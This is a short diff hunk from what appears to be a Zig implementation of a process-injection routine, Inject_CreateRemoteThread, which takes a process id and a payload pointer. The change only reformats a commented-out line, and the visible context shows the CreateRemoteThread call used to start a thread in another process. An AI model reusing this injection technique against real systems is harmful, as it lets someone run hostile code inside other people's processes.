@@ -103,7 +103,7 @@ pub fn Inject_CreateRemoteThread(ProcessId: windows.DWORD, pPayload: [*]const u8
         }
     }
 
-    // 	hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
+    //hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
 
     const tThread = CreateRemoteThread(hProcess, null, 0, @ptrCast(hThread), null, 0, null);
     if (tThread == INVALID_HANDLE_VALUE) {
